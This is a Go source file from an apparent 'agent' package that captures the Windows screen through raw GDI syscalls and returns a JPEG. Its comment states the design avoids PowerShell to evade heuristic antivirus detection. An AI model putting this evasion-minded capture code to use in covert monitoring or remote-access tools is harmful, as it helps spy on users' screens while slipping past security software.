//go:build windows

package agent

import (
	"bytes"
	"fmt"
	"image"
	"image/jpeg"
	"syscall"
	"unsafe"
)

// bitmapInfoHeader matches the Windows BITMAPINFOHEADER struct exactly (40 bytes).
type bitmapInfoHeader struct {
	biSize          uint32
	biWidth         int32
	biHeight        int32
	biPlanes        uint16
	biBitCount      uint16
	biCompression   uint32
	biSizeImage     uint32
	biXPelsPerMeter int32
	biYPelsPerMeter int32
	biClrUsed       uint32
	biClrImportant  uint32
}

// captureScreenshotWindows uses Windows GDI syscalls directly, bypassing
// PowerShell to avoid heuristic antivirus detection of inline screen-capture scripts.
func captureScreenshotWindows() ([]byte, error) {
	const (
		smCxScreen   = 0
		smCyScreen   = 1
		srccopy      = 0x00CC0020
		dibRGBColors = 0
		biRGB        = 0
	)

	user32 := syscall.NewLazyDLL("user32.dll")
	gdi32 := syscall.NewLazyDLL("gdi32.dll")

	getSystemMetrics    := user32.NewProc("GetSystemMetrics")
	getDC               := user32.NewProc("GetDC")
	releaseDC           := user32.NewProc("ReleaseDC")
	createCompatibleDC  := gdi32.NewProc("CreateCompatibleDC")
	createCompatibleBmp := gdi32.NewProc("CreateCompatibleBitmap")
	selectObject        := gdi32.NewProc("SelectObject")
	bitBlt              := gdi32.NewProc("BitBlt")
	getDIBits           := gdi32.NewProc("GetDIBits")
	deleteObject        := gdi32.NewProc("DeleteObject")
	deleteDC            := gdi32.NewProc("DeleteDC")

	w, _, _ := getSystemMetrics.Call(smCxScreen)
	h, _, _ := getSystemMetrics.Call(smCyScreen)
	if w == 0 || h == 0 {
		return nil, fmt.Errorf("primary screen unavailable")
	}

	screenDC, _, _ := getDC.Call(0)
	if screenDC == 0 {
		return nil, fmt.Errorf("GetDC failed")
	}
	defer releaseDC.Call(0, screenDC)

	memDC, _, _ := createCompatibleDC.Call(screenDC)
	if memDC == 0 {
		return nil, fmt.Errorf("CreateCompatibleDC failed")
	}
	defer deleteDC.Call(memDC)

	hBmp, _, _ := createCompatibleBmp.Call(screenDC, w, h)
	if hBmp == 0 {
		return nil, fmt.Errorf("CreateCompatibleBitmap failed")
	}
	defer deleteObject.Call(hBmp)

	// Defers execute LIFO: selectObject runs first (deselects hBmp before deleteObject).
	prev, _, _ := selectObject.Call(memDC, hBmp)
	defer selectObject.Call(memDC, prev)

	ret, _, _ := bitBlt.Call(memDC, 0, 0, w, h, screenDC, 0, 0, srccopy)
	if ret == 0 {
		return nil, fmt.Errorf("BitBlt failed")
	}

	bmi := bitmapInfoHeader{
		biSize:        uint32(unsafe.Sizeof(bitmapInfoHeader{})),
		biWidth:       int32(w),
		biHeight:      -int32(h), // negative = top-down row order
		biPlanes:      1,
		biBitCount:    32,
		biCompression: biRGB,
	}
	pixels := make([]byte, int(w)*int(h)*4)
	ret, _, _ = getDIBits.Call(
		screenDC, hBmp,
		0, h,
		uintptr(unsafe.Pointer(&pixels[0])),
		uintptr(unsafe.Pointer(&bmi)),
		dibRGBColors,
	)
	if ret == 0 {
		return nil, fmt.Errorf("GetDIBits failed")
	}

	// GDI returns pixels in BGRA order; rearrange to RGBA in-place for image.NRGBA.
	img := image.NewNRGBA(image.Rect(0, 0, int(w), int(h)))
	for i := 0; i < len(pixels); i += 4 {
		img.Pix[i+0] = pixels[i+2] // R
		img.Pix[i+1] = pixels[i+1] // G
		img.Pix[i+2] = pixels[i+0] // B
		img.Pix[i+3] = 255         // A
	}

	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 85}); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}
